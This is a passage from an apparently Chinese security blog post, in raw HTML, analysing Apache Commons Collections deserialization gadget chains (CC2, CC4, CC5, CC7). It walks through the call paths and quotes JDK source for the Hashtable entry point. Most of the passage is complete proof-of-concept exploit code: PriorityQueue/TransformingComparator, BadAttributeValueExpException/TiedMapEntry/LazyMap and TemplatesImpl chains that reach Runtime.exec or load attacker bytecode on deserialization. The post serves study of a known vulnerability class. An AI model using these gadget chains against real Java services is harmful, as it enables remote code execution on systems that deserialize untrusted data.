class_">ChainedTransformer</span>&lt;&gt;(transformers);<br><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-comment">//TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);</span><br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformerField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformerField.setAccessible(<span class="hljs-literal">true</span>);<br>        transformerField.set(transformingComparator, chainedTransformer);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><h2 id="分析：-1"><a href="#分析：-1" class="headerlink" title="分析："></a>分析：</h2><p>CC2 和 CC4 并无太大区别，CC2 的前半部分同样为：<font style="color:#080808;background-color:#ffffff;">PriorityQueue.readObject.heapify.siftDown.siftDownUsingComparator.compare</font></p><p>-&gt; <font style="color:#080808;background-color:#ffffff;">TransformingComparator.compare.transform</font></p><p>-&gt; <font style="color:#080808;background-color:#ffffff;">ChainedTransformer.transform</font></p><p><font style="color:#080808;background-color:#ffffff;">之后，CC4：</font></p><p><font style="color:rgb(44, 62, 80);">InstantiateTransformer.transform </font></p><p><font style="color:rgb(44, 62, 80);">-&gt; TrAXFilter.TrAXFilter</font></p><p><font style="color:#080808;background-color:#ffffff;">-&gt; TemplatesImpl.newTransforemer</font></p><p>-&gt; TransletClassLoader.newInstance</p><p>CC2:</p><p>InvokerTransformer.transform</p><p><font style="color:#080808;background-color:#ffffff;">-&gt; TemplatesImpl.newTransforemer</font></p><p>-&gt; TransletClassLoader.newInstance</p><h2 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.CC2;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC2Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//代码执行 </span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesFiled.set(templates, codes);<br>        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        <span class="hljs-comment">//改为 templates</span><br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformerField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformerField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//改为 invokerTransformer</span><br>        transformerField.set(transformingComparator, invokerTransformer);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854831.png"></p><h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><h2 id="分析：-2"><a href="#分析：-2" class="headerlink" title="分析："></a>分析：</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854635.png"></p><p>CC5 的起点变成了 BadAttributeValueExpException,调用的是 TiedMapEntry.toString ，之后便是 LazyMap.get（CC1-LazyMap&#x2F;CC6）。</p><p>这里从正向走比较方便，如果从 LazyMap.get 出发，会用很多调用 get 方法的类，不好找。</p><p>来到 BadAttributeValueExpException 类，跟进 toString() 方法</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854357.png"></p><p>这里的 toString() 方法要找到调用它的类，然后就找到了 TiedMapEntry 类中调用的 toString</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854464.png"></p><p>getValue 调用了 map.get，后续便是 LazyMap 调用 get。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855986.png"></p><h2 id="POC："><a href="#POC：" class="headerlink" title="POC："></a>POC：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.CC5;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC5Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">// CC1-LazyMap</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap,<span class="hljs-string">&quot;key&quot;</span>);<br>        tiedMapEntry.toString();<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">//反射修改 BadAttributeValueExpException 的 val 值</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException,tiedMapEntry);<br>        serialize(badAttributeValueExpException);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855664.png"></p><h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><h2 id="分析：-3"><a href="#分析：-3" class="headerlink" title="分析："></a>分析：</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855345.png"></p><p>CC7 的入口点变成了： HashTable.readObject</p><p>HashTable 中的 readObject 调用了 <font style="color:#080808;background-color:#ffffff;">reconstitutionPut</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855669.png"></p><p><font style="color:#080808;background-color:#ffffff;">reconstitutionPut中调用了 equals ,</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855139.png"></p><p>因为 LazyMap 不存在 equals 方法，然后找到它的父类 AbstractMapDecorator 调用 equals </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855169.png"></p><p>找到 AbstractMap.equals 中调用了 get 方法</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855646.png"></p><h2 id="构造POC："><a href="#构造POC：" class="headerlink" title="构造POC："></a>构造POC：</h2><h3 id="AbstractMap-equals"><a href="#AbstractMap-equals" class="headerlink" title="AbstractMap.equals"></a>AbstractMap.equals</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbstractMap</span>&lt;K,V&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>&lt;K,V&gt; &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object o)</span> &#123;<br>    <span class="hljs-comment">//判断传入的是否为同一对象</span><br>    <span class="hljs-keyword">if</span> (o == <span class="hljs-built_in">this</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-comment">//类型检查</span><br>    <span class="hljs-keyword">if</span> (!(o <span class="hljs-keyword">instanceof</span> Map))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;<br>    <span class="hljs-comment">//比较两个 map 的 size() </span><br>    <span class="hljs-keyword">if</span> (m.size() != size())<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//entrySet() 的迭代器，用于遍历所有键值对（Entry&lt;K,V&gt;）</span><br>        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();<br>        <span class="hljs-comment">//遍历每一个映射条目，取出 key 和 value，准备与另一个 map m 中对应的值做比较</span><br>        <span class="hljs-keyword">while</span> (i.hasNext()) &#123;<br>            Entry&lt;K,V&gt; e = i.next();<br>            <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> e.getKey();<br>            <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> e.getValue();<br>            <br>            <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">//value == null 进入</span><br>                <span class="hljs-keyword">if</span> (!(m.get(key)==<span class="hljs-literal">null</span> &amp;&amp; m.containsKey(key)))<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">if</span> (!value.equals(m.get(key)))<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (ClassCastException unused) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (NullPointerException unused) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Hashtable-reconstitutionPut"><a href="#Hashtable-reconstitutionPut" class="headerlink" title="Hashtable.reconstitutionPut"></a><font style="color:rgb(44, 62, 80);">Hashtable.</font><font style="color:#080808;background-color:#ffffff;">reconstitutionPut</font></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reconstitutionPut</span><span class="hljs-params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span><br><span class="hljs-keyword">throws</span> StreamCorruptedException<br>&#123;<br>    <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>    &#125;<br>    <span class="hljs-comment">// Makes sure the key is not already in the hashtable.</span><br>    <span class="hljs-comment">// This should not happen in deserialized version.</span><br>    <span class="hljs-comment">//计算 key 的哈希值</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> key.hashCode();<br>    <span class="hljs-comment">//% tab.length 将哈希值映射到数组索引范围</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;<br>    <span class="hljs-comment">//从 tab[index] 中将 Entry 放入循环</span><br>    <span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-literal">null</span> ; e = e.next) &#123;<br>        <span class="hljs-comment">//先 e.hash == hash，比较已有元素和新元素的hash是否相同</span><br>        <span class="hljs-comment">//一样之后，接着调用 e.key.equals(key)，比较已有元素的key和新的key是否相同</span><br>        <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>            <span class="hljs-comment">//如果 key重复，抛出异常</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// Creates the new entry.</span><br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>    Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];<br>    tab[index] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;&gt;(hash, key, value, e);<br>    count++;<br>&#125;<br></code></pre></td></tr></table></figure><p>**注意：首先满足 value !&#x3D; null，之后满足俩个元素的 hash 值相同，然后在判断 key 是否重复时触发 equals 方法 **</p><h3 id="HashTable-readObject"><a href="#HashTable-readObject" class="headerlink" title="HashTable.readObject"></a><font style="color:rgb(26, 32, 44);">HashTable.readObject</font></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br><span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>&#123;<br>    <span class="hljs-comment">// Read in the length, threshold, and loadfactor</span><br>    s.defaultReadObject();<br><br>    <span class="hljs-comment">// Read the original length of the array and number of elements</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">origlength</span> <span class="hljs-operator">=</span> s.readInt();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">elements</span> <span class="hljs-operator">=</span> s.readInt();<br><br>    <span class="hljs-comment">// Compute new size with a bit of room 5% to grow but</span><br>    <span class="hljs-comment">// no larger than the original size.  Make the length</span><br>    <span class="hljs-comment">// odd if it&#x27;s large enough, this helps distribute the entries.</span><br>    <span class="hljs-comment">// Guard against the length ending up zero, that&#x27;s not valid.</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>)(elements * loadFactor) + (elements / <span class="hljs-number">20</span>) + <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">if</span> (length &gt; elements &amp;&amp; (length &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>)<br>        length--;<br>    <span class="hljs-keyword">if</span> (origlength &gt; <span class="hljs-number">0</span> &amp;&amp; length &gt; origlength)<br>        length = origlength;<br>    table = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;?,?&gt;[length];<br>    threshold = (<span class="hljs-type">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="hljs-number">1</span>);<br>    count = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// Read the number of elements and then all the key/value objects</span><br>    <span 